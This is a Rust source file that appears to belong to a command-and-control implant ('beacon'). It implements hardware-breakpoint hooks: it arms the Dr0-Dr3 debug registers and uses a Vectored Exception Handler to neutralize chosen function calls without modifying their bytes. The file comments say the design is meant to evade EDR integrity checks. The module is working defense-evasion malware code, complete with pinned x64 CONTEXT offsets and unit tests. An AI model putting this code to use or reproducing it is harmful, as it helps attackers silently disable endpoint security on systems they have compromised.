//! Hardware-breakpoint hooks (port of the Dr0-Dr3 + VEH mechanism of the
//! original project).
//!
//! Inline patching (overwriting a function's first bytes) flips module pages
//! from Image/Shared to Private/Commit — visible to EDR integrity checks.
//! Hardware breakpoints leave every byte pristine: Dr0-Dr3 raise a #DB
//! exception at the hooked address, a Vectored Exception Handler intercepts
//! it and neutralizes the call by rewriting the saved CONTEXT (return to the
//! caller with a synthesized result). Only four debug slots exist, and they
//! are armed per-thread; here they arm on the beacon's own thread
//! (re-arming the async thread pool comes with phase 3).
//!
//! Everything pure lives here and is host-tested: the x64 CONTEXT layout
//! (offsets pinned), the Dr7 enable bits, and the neutralization decision —
//! the beacon only contributes the syscall glue and the handler pointer.

/// A hardware-breakpoint target: address to break on and the value the
/// neutralized call must return to its caller.
#[derive(Clone, Copy, PartialEq, Eq)]
pub struct HookTarget {
    pub addr: u64,
    pub ret_value: u64,
}

/// Hook table bound to the four debug slots. Slot i is active when its
/// address is non-zero.
pub type Hooks = [HookTarget; 4];

impl HookTarget {
    pub const fn disabled() -> Self {
        HookTarget {
            addr: 0,
            ret_value: 0,
        }
    }
}

/// Fresh empty hook table.
pub const fn no_hooks() -> Hooks {
    [HookTarget::disabled(); 4]
}

// ---------------------------------------------------------------------------
// x64 CONTEXT (partial, offsets pinned by tests)
// ---------------------------------------------------------------------------

/// `CONTEXT_AMD64`.
pub const CONTEXT_AMD64: u32 = 0x0010_0000;
/// `CONTEXT_CONTROL`.
pub const CONTEXT_CONTROL: u32 = CONTEXT_AMD64 | 0x0000_0001;
/// `CONTEXT_INTEGER`.
pub const CONTEXT_INTEGER: u32 = CONTEXT_AMD64 | 0x0000_0002;
/// `CONTEXT_DEBUG_REGISTERS`.
pub const CONTEXT_DEBUG_REGISTERS: u32 = CONTEXT_AMD64 | 0x0000_0010;
/// The flags the beacon uses to arm: control (for Rsp/Rip), integer and the
/// debug registers. Floating point is deliberately excluded — requesting it
/// requires the XSAVE area and 64-byte alignment, and the hooks do not need
/// it.
pub const CONTEXT_ARM_FLAGS: u32 = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS;

/// Partial x64 CONTEXT, repr(C) with pinned offsets (see tests). Sized to
/// the full CONTEXT (0x4D8) so the buffer handed to NtGet/NtSetContextThread
/// is always large enough; the tail stays zeroed.
#[repr(C)]
pub struct Context {
    _home: [u64; 6],            // +0x00 P1Home..P6Home
    pub context_flags: u32,     // +0x30
    pub mxcsr: u32,             // +0x34
    _segs: [u32; 4],            // +0x38 SegCs..EFlags (16 bytes, ends at Dr0)
    pub dr0: u64,               // +0x48
    pub dr1: u64,               // +0x50
    pub dr2: u64,               // +0x58
    pub dr3: u64,               // +0x60
    pub dr6: u64,               // +0x68
    pub dr7: u64,               // +0x70
    pub rax: u64,               // +0x78
    pub rcx: u64,               // +0x80
    pub rdx: u64,               // +0x88
    pub rbx: u64,               // +0x90
    pub rsp: u64,               // +0x98
    pub rbp: u64,               // +0xA0
    pub rsi: u64,               // +0xA8
    pub rdi: u64,               // +0xB0
    pub r8: u64,                // +0xB8
    pub r9: u64,                // +0xC0
    pub r10: u64,               // +0xC8
    pub r11: u64,               // +0xD0
    pub r12: u64,               // +0xD8
    pub r13: u64,               // +0xE0
    pub r14: u64,               // +0xE8
    pub r15: u64,               // +0xF0
    pub rip: u64,               // +0xF8
    _tail: [u8; 0x4D8 - 0x100], // float/XSAVE area: untouched, kept zeroed
}

impl Context {
    /// Zeroed CONTEXT with the arm flags set. The caller arms it by filling
    /// Dr0-Dr3/Dr7 (the debug registers survive NtSetContextThread only when
    /// the flags request them).
    #[inline]
    pub fn arm_scratch() -> Self {
        Context {
            _home: [0; 6],
            context_flags: CONTEXT_ARM_FLAGS,
            mxcsr: 0,
            _segs: [0; 4],
            dr0: 0,
            dr1: 0,
            dr2: 0,
            dr3: 0,
            dr6: 0,
            dr7: 0,
            rax: 0,
            rcx: 0,
            rdx: 0,
            rbx: 0,
            rsp: 0,
            rbp: 0,
            rsi: 0,
            rdi: 0,
            r8: 0,
            r9: 0,
            r10: 0,
            r11: 0,
            r12: 0,
            r13: 0,
            r14: 0,
            r15: 0,
            rip: 0,
            _tail: [0; 0x4D8 - 0x100],
        }
    }
}

/// Dr7 local-enable bit for slot `i` (RW=execute, LEN ignored for execute
/// breakpoints — both stay zero).
#[inline]
pub const fn dr7_local_enable(slot: usize) -> u64 {
    1u64 << (2 * slot)
}

/// Dr7 word for the given hooks: local-enable bits for every active slot.
#[inline]
pub const fn dr7_for(hooks: &Hooks) -> u64 {
    let mut dr7 = 0u64;
    let mut i = 0;
    while i < 4 {
        if hooks[i].addr != 0 {
            dr7 |= dr7_local_enable(i);
        }
        i += 1;
    }
    dr7
}

/// Write the hook addresses and Dr7 into a CONTEXT fetched from
/// NtGetContextThread. Dr6 is cleared (stale status bits keep firing).
#[inline]
pub fn arm_context(ctx: &mut Context, hooks: &Hooks) {
    ctx.dr0 = hooks[0].addr;
    ctx.dr1 = hooks[1].addr;
    ctx.dr2 = hooks[2].addr;
    ctx.dr3 = hooks[3].addr;
    ctx.dr6 = 0;
    ctx.dr7 = dr7_for(hooks);
}

// ---------------------------------------------------------------------------
// Exception records and the neutralization decision
// ---------------------------------------------------------------------------

/// `STATUS_SINGLE_STEP` — what a Dr0-Dr3 execute breakpoint raises.
pub const STATUS_SINGLE_STEP: u32 = 0x8000_0004;

/// `EXCEPTION_CONTINUE_SEARCH`.
pub const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
/// `EXCEPTION_CONTINUE_EXECUTION`.
pub const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;

/// Partial EXCEPTION_RECORD: only the fields the handler reads.
#[repr(C)]
pub struct ExceptionRecord {
    pub exception_code: u32,    // +0x00
    pub exception_flags: u32,   // +0x04
    pub exception_record: u64,  // +0x08
    pub exception_address: u64, // +0x10
    pub number_parameters: u32, // +0x18
    _pad: u32,
    _info: [u64; 15], // ExceptionInformation
}

/// `EXCEPTION_POINTERS`.
#[repr(C)]
pub struct ExceptionPointers {
    pub exception_record: *mut ExceptionRecord,
    pub context_record: *mut Context,
}

/// Neutralize a hooked call from the saved CONTEXT: pop the return address
/// into Rip, push nothing (Rsp += 8) and synthesize the return value in Rax.
/// The target function's code is never touched; the caller sees a clean
/// return. Returns `true` when the exception was consumed.
///
/// # Safety
///
/// `ctx` must be a valid CONTEXT; the hook addresses must be executable
/// addresses whose call sites are real `call` instructions (a plain return
/// exists on the stack).
pub unsafe fn neutralize(ctx: *mut Context, hooks: &Hooks, exception_code: u32) -> bool {
    if exception_code != STATUS_SINGLE_STEP {
        return false;
    }
    let rip = (*ctx).rip;
    let mut slot = 0usize;
    while slot < 4 {
        let hook = hooks[slot];
        if hook.addr != 0 && hook.addr == rip {
            // Return to the caller with the synthesized value.
            let ret = core::ptr::read((*ctx).rsp as *const u64);
            (*ctx).rsp += 8;
            (*ctx).rip = ret;
            (*ctx).rax = hook.ret_value;
            // Clear the slot's status bits in Dr6 (BS/BT markers).
            (*ctx).dr6 = 0;
            return true;
        }
        slot += 1;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::prelude::v1::*;

    #[test]
    fn x64_context_offsets_are_pinned() {
        use core::mem::{offset_of, size_of};
        assert_eq!(offset_of!(Context, context_flags), 0x30);
        assert_eq!(offset_of!(Context, dr0), 0x48);
        assert_eq!(offset_of!(Context, dr1), 0x50);
        assert_eq!(offset_of!(Context, dr2), 0x58);
        assert_eq!(offset_of!(Context, dr3), 0x60);
        assert_eq!(offset_of!(Context, dr6), 0x68);
        assert_eq!(offset_of!(Context, dr7), 0x70);
        assert_eq!(offset_of!(Context, rax), 0x78);
        assert_eq!(offset_of!(Context, rsp), 0x98);
        assert_eq!(offset_of!(Context, rip), 0xF8);
        assert_eq!(size_of::<Context>(), 0x4D8);
        assert_eq!(size_of::<ExceptionRecord>(), 0x98);
        assert_eq!(size_of::<ExceptionPointers>(), 0x10);
    }

    #[test]
    fn dr7_local_enable_bits() {
        assert_eq!(dr7_local_enable(0), 0b0001);
        assert_eq!(dr7_local_enable(1), 0b0100);
        assert_eq!(dr7_local_enable(2), 0b1_0000);
        assert_eq!(dr7_local_enable(3), 0b100_0000);
    }

    #[test]
    fn dr7_for_only_enables_active_slots() {
        let hooks = [
            HookTarget {
                addr: 0x1000,
                ret_value: 0,
            },
            HookTarget::disabled(),
            HookTarget {
                addr: 0x2000,
                ret_value: 0,
            },
            HookTarget::disabled(),
        ];
        assert_eq!(dr7_for(&hooks), 0b0001 | 0b1_0000);
        assert_eq!(dr7_for(&no_hooks()), 0);
    }

    fn hooked_stack_ctx(hook: HookTarget) -> (Vec<u64>, Context) {
        // A stack with [ret_addr, garbage..] and a context stopped at hook.
        let stack = vec![0xDEAD_BEEF_0000_1000u64, 0, 0, 0];
        let mut ctx = Context::arm_scratch();
        ctx.rip = hook.addr;
        ctx.rsp = stack.as_ptr() as u64;
        ctx.rax = 0xFFFF_FFFF_FFFF_FFFF;
        (stack, ctx)
    }

    #[test]
    fn neutralize_returns_to_caller_with_synthesized_value() {
        let hook = HookTarget {
            addr: 0x1400_0010,
            ret_value: 0,
        };
        let hooks = [
            hook,
            HookTarget::disabled(),
            HookTarget::disabled(),
            HookTarget::disabled(),
        ];
        let (stack, mut ctx) = hooked_stack_ctx(hook);
        let consumed = unsafe { neutralize(&mut ctx, &hooks, STATUS_SINGLE_STEP) };
        assert!(consumed);
        assert_eq!(ctx.rip, 0xDEAD_BEEF_0000_1000); // returned to caller
        assert_eq!(ctx.rsp, stack.as_ptr() as u64 + 8); // return address popped
        assert_eq!(ctx.rax, 0); // clean synthesized result
        assert_eq!(ctx.dr6, 0); // status cleared for the next hit
    }

    #[test]
    fn neutralize_only_consumes_single_step_at_hooked_addresses() {
        let hook = HookTarget {
            addr: 0x1400_0010,
            ret_value: 0,
        };
        let hooks = [
            hook,
            HookTarget::disabled(),
            HookTarget::disabled(),
            HookTarget::disabled(),
        ];
        let (_s, mut ctx) = hooked_stack_ctx(hook);

        // Wrong exception code: pass through.
        assert!(!unsafe { neutralize(&mut ctx, &hooks, 0xC000_0005) });
        // Single step but at another address: pass through.
        ctx.rip = 0x9000;
        assert!(!unsafe { neutralize(&mut ctx, &hooks, STATUS_SINGLE_STEP) });
    }

    #[test]
    fn neutralize_finds_the_right_slot() {
        let hooks = [
            HookTarget::disabled(),
            HookTarget::disabled(),
            HookTarget {
                addr: 0x7000,
                ret_value: 5,
            },
            HookTarget::disabled(),
        ];
        let stack = vec![0xAAAA_u64];
        let mut ctx = Context::arm_scratch();
        ctx.rip = 0x7000;
        ctx.rsp = stack.as_ptr() as u64;
        assert!(unsafe { neutralize(&mut ctx, &hooks, STATUS_SINGLE_STEP) });
        assert_eq!(ctx.rax, 5);
        assert_eq!(ctx.rip, 0xAAAA);
    }

    #[test]
    fn arm_context_writes_slots_and_dr7() {
        let hooks = [
            HookTarget {
                addr: 0x1000,
                ret_value: 0,
            },
            HookTarget::disabled(),
            HookTarget {
                addr: 0x3000,
                ret_value: 0,
            },
            HookTarget::disabled(),
        ];
        let mut ctx = Context::arm_scratch();
        ctx.dr6 = 0xFFFF;
        arm_context(&mut ctx, &hooks);
        assert_eq!(ctx.dr0, 0x1000);
        assert_eq!(ctx.dr1, 0);
        assert_eq!(ctx.dr2, 0x3000);
        assert_eq!(ctx.dr3, 0);
        assert_eq!(ctx.dr7, 0b0001 | 0b1_0000);
        assert_eq!(ctx.dr6, 0);
        assert_eq!(ctx.context_flags, CONTEXT_ARM_FLAGS);
    }
}
